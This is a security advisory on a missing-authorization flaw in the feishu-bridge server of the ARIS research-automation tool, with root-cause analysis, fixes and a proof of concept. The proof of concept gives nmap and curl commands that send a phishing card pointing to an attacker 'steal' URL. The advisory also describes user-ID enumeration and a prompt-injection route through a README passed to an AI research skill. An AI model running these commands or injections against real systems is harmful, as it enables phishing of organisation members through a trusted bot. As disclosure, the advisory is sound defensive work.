# Research — Feishu Bridge Broken Access Control

---

## 1. Information

| Field | Value |
|---|---|
| **Vulnerability type** | Broken Access Control |
| **CWE** | CWE-862 — Missing Authorization |
| **CVSS 3.1 Base Score** | **8.1 (HIGH)** |
| **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| **CVSS breakdown** | AV:Network / AC:Low / PR:None / UI:None / S:Unchanged / C:None / I:High / A:None |
| **Discovered** | 2026-04-14 |

---

## 2. Affected Product

| Field | Value |
|---|---|
| **Product name** | Auto-claude-code-research-in-sleep (ARIS) |
| **Vendor / Maintainer** | wanshuiyin (GitHub) |
| **Repository** | https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep |
| **Component** | [`mcp-servers/feishu-bridge/server.py`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py) |
| **Affected versions** | <= v0.3.11 (latest at 2026-04-14) |

---

## 3. Vulnerability Description

```
Auto-claude-code-research-in-sleep (ARIS) before any patched version allows
unauthenticated remote attackers to send Lark/Feishu messages to arbitrary
organization members via the feishu-bridge component. The HTTP server in
mcp-servers/feishu-bridge/server.py binds to 0.0.0.0 (all interfaces) on
port 5000 and accepts a user_id parameter from the POST /send request body
without any authorization check, allowing any network-adjacent host to deliver
messages to any Feishu user in the organization using the legitimate bot
credentials of the ARIS operator.
```

---

## 4. Technical Details

### 4.1 Product Architecture

ARIS is an AI-driven research automation system built on Claude Code. Researchers
clone the repository, install skill files into Claude Code, and start the
`feishu-bridge` component — an HTTP server that proxies Lark/Feishu notifications
from Claude Code to the researcher's Lark account.

```
┌─────────────────────────────────────────────────────────────┐
│                   Researcher Machine                         │
│                                                             │
│  Claude Code (ARIS)                                         │
│  ├── /auto-review-loop                                      │
│  ├── /run-experiment        POST localhost:5000/send        │
│  └── /research-pipeline  ─────────────────────────────────→ │
│                                                             │
│  feishu-bridge (python3 server.py)                          │
│  ├── FEISHU_APP_ID     = cli_xxxx    ← Lark app credential  │
│  ├── FEISHU_APP_SECRET = xxxxxxxx    ← Lark app credential  │
│  ├── FEISHU_USER_ID    = ou_owner    ← intended recipient   │
│  └── HTTPServer("0.0.0.0", 5000)    ← ⚠️ all interfaces⚠️  │
└─────────────────────────────────────────────────────────────┘
                        │
                        │ Feishu/Lark API
                        ▼
              Owner receives ARIS notification
```

**Design assumption (broken):** Only ARIS on localhost would call the bridge.
Since localhost was the expected caller, no authentication was implemented.

---

### 4.2 Root Cause — Two Compounding Flaws

#### Flaw 1 — Missing Authorization on `POST /send`

[`server.py:179`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L179) — The endpoint reads the Lark recipient directly from the HTTP request body:

```python
user_id = body.get("user_id", USER_ID)
```

`FEISHU_USER_ID` (the owner's configured ID) is used only as a fallback when the field is absent. No check verifies:
- who the caller is
- whether the supplied `user_id` matches the configured owner
- any API key, token, HMAC, or IP allowlist

The value is passed directly to the Lark API at [`server.py:190-192`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L190-L192):

```python
if msg_type == "text":
    result = send_text(user_id, content)     # attacker-controlled
else:
    result = send_card(user_id, title, content, color)
```

#### Flaw 2 — Excessive Network Exposure

[`server.py:226`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L226) — The server binds to all interfaces:

```python
server = HTTPServer(("0.0.0.0", PORT), BridgeHandler)
```

This exposes the unauthenticated endpoint to every network interface — LAN, VPN, university WiFi, cloud subnets, and (when deployed on cloud GPU servers per README documentation) the public internet.

#### Combined Effect

| | Intended | Actual |
|---|---|---|
| Caller | localhost only | Any host on the network |
| Recipient | `FEISHU_USER_ID` always | Any `user_id` from request body |
| Authentication | Not needed (localhost only) | None — but `0.0.0.0` exposed |

### 4.3 Lark Permission Model — Why the Blast Radius Is Org-Wide

The researcher creates a Feishu/Lark custom app (bot) and configures it with:
- **Permission:** `im:message:send_as_bot` — allows the bot to send messages
- **App Availability:** typically "All employees" — the bot can message anyone in the org

```
FEISHU_USER_ID in .env
  = application-level config (ARIS self-restricts to owner)
  ≠ API-level restriction (Lark API does NOT enforce this)

Lark API checks:
  ✓ APP_ID + APP_SECRET valid?
  ✓ App has im:message:send_as_bot permission?
  ✓ Target user is within app visibility scope?

Lark API does NOT check:
  ✗ Who is calling the API? (bridge? attacker? anyone)
  ✗ Is the target the configured FEISHU_USER_ID?
  ✗ Where does the request originate from?
```

When App Availability = "All employees" (the common configuration), the bot can message **every user in the organization**. The `FEISHU_USER_ID` restriction exists only in ARIS code — and [`server.py:179`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L179) allows any caller to bypass it.

---

### 4.4 Attack Vector — Network-Adjacent (LAN / VPN)

**Preconditions:**
- Attacker is on the same network as the researcher machine
- `feishu-bridge` is running (it runs 24/7 as a background process, independent of ARIS activity)
- Attacker knows or can enumerate a valid Feishu `open_id`

**Attack steps:**

```
Step 1 — Discovery
  nmap -p 5000 <subnet> --open
  → finds researcher machine with port 5000 open

Step 2 — Confirm no authentication
  GET http://<target>:5000/health
  → {"status": "ok", "port": 5000}
  No auth challenge. No rate limiting.

Step 3 — Exploitation
  POST http://<target>:5000/send
  Content-Type: application/json
  {"user_id":"<victim_open_id>","title":"ARIS Alert","body":"<payload>"}
  → {"ok": true, "message_id": "<id>"}

Result: victim receives phishing card from trusted ARIS bot identity
```

**How attacker obtains victim `open_id`:**
- Lark API user lookup by email (requires `APP_ID` + `APP_SECRET`, often found in `.env` committed to public repos)
- Error-based enumeration via bridge: valid `open_id` returns `{"ok":true}`, invalid returns Lark error code — differential response confirms valid users

---

## 5. Proof of Concept

### Environment

| Role | IP | Identity |
|---|---|---|
| Researcher | `192.168.106.128` | Runs ARIS + feishu-bridge |
| Attacker | `192.168.106.141` (Kali) | Same LAN, zero credentials |
| Lark owner | account2 | `ou_68df7ed0ea99c4c5a0dbe510c303a87c` |
| Lark victim | Thomas Kane | `ou_fd1afecd61fa8df0a8557d85a84cf4be` |

- Owner `account2` and victim `Thomas Kane` are in the **same Lark organization**
- Bot permission: `im:message:send_as_bot`
- Bot scope: **All employees** in org

<img width="1860" height="728" alt="Screenshot_31" src="https://github.com/user-attachments/assets/39c550a5-eba2-43a3-b8bc-762041e02992" />
<img width="1839" height="913" alt="Screenshot_32" src="https://github.com/user-attachments/assets/0298d41b-fe79-46cb-8066-b46a5b32be26" />

### Exploit — From Kali Machine (Vector A)

```bash
# 1. Discover
nmap -p 5000 192.168.106.128 --open
# Result: 5000/tcp open  upnp

# 2. Probe
curl http://192.168.106.128:5000/health
# Result: {"status": "ok", "port": 5000}

# 3. Exploit — single command, no credentials
curl -X POST http://192.168.106.128:5000/send \
  -H "Content-Type: application/json" \
  -d '{"user_id":"ou_fd1afecd61fa8df0a8557d85a84cf4be","title":"ARIS Security Alert","body":"Session expired.\nPlease sign in again at: http://attacker.domain.com/steal","color":"red"}'
# Result: {"ok": true, "message_id": "om_x100b52e6702f40a4ee8d1af618275e4"}
# Thomas Kane received the card on Lark (confirmed visually)
```

<img width="1910" height="933" alt="image" src="https://github.com/user-attachments/assets/e7241bcb-154e-4d94-bf71-1a50db9cc799" />

### Prompt Injection (Vector B — Supplementary)

```bash
/research-lit https://raw.githubusercontent.com/xuantien177/efficient-attention-2026/refs/heads/main/README.md  
```

> **Note on Vector B:** Tested against Claude Sonnet 4 which successfully
> detected the injection payload. However, the root cause (unauthenticated
> bridge on `0.0.0.0`) remains exploitable via Vector A regardless of LLM
> safety capabilities. ARIS supports multiple executor models with varying
> safety training — defense should not depend on LLM detection alone.

**Key observation:** Both attacks returned identical `{"ok": true}` responses
to legitimate ARIS calls. The bridge provides no signal distinguishing
authorized from unauthorized requests.

<img width="1012" height="892" alt="image" src="https://github.com/user-attachments/assets/29bbc3fe-1bd0-4e55-99d5-4c0ba2093396" />
<img width="985" height="800" alt="image" src="https://github.com/user-attachments/assets/e5282c92-3b4f-4ad9-ba51-13a1da9676c1" />

---

## 6. Impact

**Scope:** Every Lark/Feishu user in the same organization as any ARIS deployment.

**Attacker capabilities:**
1. Send arbitrary messages to any org member as the trusted ARIS bot
2. Craft convincing phishing cards (GPU billing alerts, login prompts, urgent approvals) from a bot the organization has explicitly whitelisted
3. Enumerate valid Feishu `open_id` values via differential error responses
4. Exploit cloud deployments: README documents vast.ai / RunPod GPU deployment — port 5000 exposed to the **public internet** in these configurations

**Attack surface amplification:**
- Bridge runs 24/7 as a background process — attacker does not need to wait for ARIS activity
- No log entries distinguish attacker traffic from ARIS traffic in bridge logs
- Prompt injection vector (Vector B) requires zero network access to the researcher machine

---

## 7. Remediation

### Immediate Fix (2 lines)

[`server.py:226`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L226) — Restrict to localhost:
```python
server = HTTPServer(("127.0.0.1", PORT), BridgeHandler)
```

[`server.py:179`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L179) — Ignore `user_id` from request body:
```python
user_id = USER_ID   # always use configured env var
```

### Short-Term Hardening

```python
# Add shared-secret header validation
API_KEY = os.environ.get("BRIDGE_API_KEY", "")

def do_POST(self):
    if API_KEY and self.headers.get("X-API-Key") != API_KEY:
        self._json_response({"error": "unauthorized"}, 401)
        return
    # existing handler...
```

### Long-Term

- Add `BRIDGE_API_KEY` to `.env.example` and startup documentation
- Add firewall guidance to README for cloud GPU deployments
- Add content sanitization guidance for AI skills consuming external content

---

## 8. References

| Resource | Link |
|---|---|
| Vulnerable code (Flaw 1) | [`server.py:179`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L179) |
| Vulnerable code (Flaw 2) | [`server.py:226`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L226) |
| Data flow (send_card) | [`server.py:59-92`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L59-L92) |
| Data flow (send_text) | [`server.py:95-112`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L95-L112) |
| Full handler | [`server.py:174-195`](https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep/blob/c50f062/mcp-servers/feishu-bridge/server.py#L174-L195) |
| CWE-862 | https://cwe.mitre.org/data/definitions/862.html |
| OWASP A01:2025 | https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/ |
